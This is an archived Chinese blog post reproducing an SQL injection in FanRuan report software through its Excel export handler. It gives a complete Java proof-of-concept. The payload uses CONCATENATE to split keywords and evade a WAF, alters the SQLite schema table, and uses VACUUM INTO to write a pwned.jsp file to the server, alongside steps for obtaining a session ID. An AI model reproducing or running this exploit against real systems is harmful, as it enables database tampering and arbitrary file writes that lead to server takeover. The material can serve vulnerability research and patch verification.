---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  帆软 excel SQL注入漏洞复现  
 天黑说嘿话   2026-01-13 07:13  
  
   
  
## 安装环境  
  
安装包：  
  
https://pan.baidu.com/s/1hGxPKnmaScPf8ypjVDwhwQ?pwd=qt2r  
  
不清楚是不是版本问题，网上给出的利用方法和我本地复现不一样  
## sessionID 获取  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaTfcxibuvF9Yx7kcDoR65iak9SzicLAhbuZgmmfIxhNw9F5aggfyhkFPrA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaGDNIorvpvEj3MVaqDjaY4SguIDicMxuFIDHHAbgL3maRxGxvIib09hPQ/640?wx_fmt=png&from=appmsg "")  
  
将获取到的sessionID 填入到下面的poc中  
## 生成poc代码  
```
import com.fr.base.Formula;  import com.fr.base.Parameter;  import com.fr.general.xml.GeneralXMLTools;  import com.fr.nx.app.web.handler.export.largeds.bean.LargeDatasetExcelExportJavaScript;  import java.io.UnsupportedEncodingException;  import java.net.URLEncoder;    public class Main {      public static void main(String[] args) {          // 1. 构造复杂的混淆 SQL 公式 (针对 SQLite/VACUUM INTO 漏洞利用)          // 使用 CONCATENATE 拆分敏感关键字绕过 WAF        String sqlPayload = "sql('FRDemo',CONCATENATE(\"pr\",\"agm\",\"a wr\",\"i\",\"t\",\"a\",\"ble\",\"_sch\",\"e\",\"ma=o\",\"n\"),1)" +                  "-sql('FRDemo',CONCATENATE(\"dele\",\"t\",\"e f\",\"r\",\"o\",\"m sq\",\"li\",\"t\",\"e_sc\",\"he\",\"ma w\",\"here\",\" na\",\"m\",\"e!\",\"=\",\"'s\",\"ql\",\"ite\",\"_s\",\"ta\",\"t\",\"1'\"),1)" +                  "-sql('FRDemo',CONCATENATE(\"V\",\"A\",\"C\",\"U\",\"U\",\"M\",\" i\",\"nt\",\"o('\",ENV_HOME,\"/\",\".\",\".\",\"/\",\".\",\"/\",\"pwned\",\".\",\"j\",\"s\",\"p\",\"')\"),1)";            // 2. 构造参数对象，注意：必须显式使用 Formula 对象          Parameter p = new Parameter();          p.setName("c"); // 对应目标中的 name="c"        p.setValue(new Formula(sqlPayload)); // 关键：传入 Formula 对象，XML 才会生成 <O t="Formula">          LargeDatasetExcelExportJavaScript js = new LargeDatasetExcelExportJavaScript();          js.setDsName("1"); // 对应目标中的 dsName="1"        js.setParameters(new Parameter[]{p});            String rawXml = GeneralXMLTools.writeXMLableAsString(js);            String finalXml = wrapInPd(rawXml);          System.out.println("--- 原始 Payload ---");          System.out.println(finalXml);          System.out.println("\n--- URL 编码后的 Params ---");          System.out.println(urlEncode(finalXml));      }        private static String wrapInPd(String xml) {          // 移除 XML 头部声明          String content = xml.replaceFirst("<\\?xml.*?\\?>", "").trim();          // 移除 SDK 自动添加的类路径属性，使其变精简          content = content.replaceAll("class=\".*?\"", "");          content = content.replaceAll("xmlVersion=\".*?\"", "");          // 包装 pd 标签          return "<pd>\n " + content + "\n</pd>";      }        public static String urlEncode(String str) {          try {              return URLEncoder.encode(str, "UTF-8");          } catch (UnsupportedEncodingException e) {              return str;          }      }  }
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaOTAFsTZYkmDGuaa9uISfs8US9DoplourhPfBic96J7JiasUuZpmtB6Yg/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaO2KwhTuaiakXeCZesMNfmOM5OjUtR4r8gEfyqCvlzxx1TX9l0QomWlQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaepMUlSjibTbqe7cETTxg0QbujVUMOKI6aDjyUqfN7O7cNZFHolzy9BA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vOGOib9z4Wz5OoIhsNzkkkH8bg9fY4osaM8nXVORzzIC30dvs2KDzsFHNeIVbZa1RBwJKyGeCIHRia9iar8h8gFCQ/640?wx_fmt=png&from=appmsg "")  
  
  
   
  
### 参考  
- • [https://mp.weixin.qq.com/s/K9VVCM5ndDlZxIW86CQ_OQ?scene=1&click_id=3](https://mp.weixin.qq.com/s?__biz=MzI5OTUxMjA3OA==&mid=2247483854&idx=1&sn=95812fe7e2e8a012c82949ff4f1318c0&scene=21&click_id=3#wechat_redirect)  
  
  
  
  
   
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
